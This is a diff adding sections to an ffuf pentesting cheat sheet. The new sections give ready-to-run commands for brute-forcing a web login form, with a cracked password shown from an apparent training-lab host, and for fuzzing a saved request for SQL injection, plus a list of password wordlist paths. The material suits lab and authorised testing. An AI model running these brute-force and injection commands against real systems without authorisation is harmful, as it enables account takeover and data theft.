@@ -263,6 +263,66 @@ ffuf -w wordlist.txt:FUZZ -u http://TARGET/FUZZ -replay-proxy http://127.0.0.1:8
 
 ---
 
+## HTTP Brute Force (Login Forms)
+
+> **WARNING:** Do NOT use `ffuf -request login.req -request-proto http` for brute force attacks. It will not find the password. You MUST build the request manually with `-u`, `-d`, and `-H` flags.
+
+> **`-ac` (auto-calibrate) is OK for brute force** — it filters by response differences.
+> **`-ac` is NOT OK for vhost enumeration** — use `-fs` with the default response size instead.
+
+### Manual Build (Correct Way)
+
+```bash
+ffuf -u http://TARGET/login.php \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=FUZZ" \
+  -w /path/to/wordlist.txt \
+  -ac
+```
+
+### Full Example
+
+```bash
+ffuf -u http://monitoring.inlanefreight.local/login.php \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -w /md/wl/darkweb2017_top-100.txt \
+  -d "username=admin&password=FUZZ" \
+  -ac
+
+# Result:
+# 12qwaszx                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
+```
+
+Prefer ffuf over hydra for HTTP brute force — it is faster and more flexible.
+
+---
+
+## SQLi Discovery with ffuf
+
+Save a Burp request with `FUZZ` replacing the injection point, then fuzz with a SQLi wordlist:
+
+```bash
+ffuf -request search.req -request-proto http -w /path/to/sqli-basic.txt -fs 878
+```
+
+Filter by response size (`-fs`) to remove baseline responses. Look for responses with different sizes indicating SQL errors or successful injection.
+
+---
+
+## Password Wordlists
+
+```
+/md/wl/10k-most-common.txt
+/md/wl/darkweb2017_top-10000.txt
+/md/wl/darkweb2017_top-100.txt
+/md/wl/top-passwords-shortlist.txt
+/md/wl/walk-the-line.txt
+/usr/share/wordlists/rockyou.txt
+/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+```
+
+---
+
 ## Common Wordlists
 
 ```
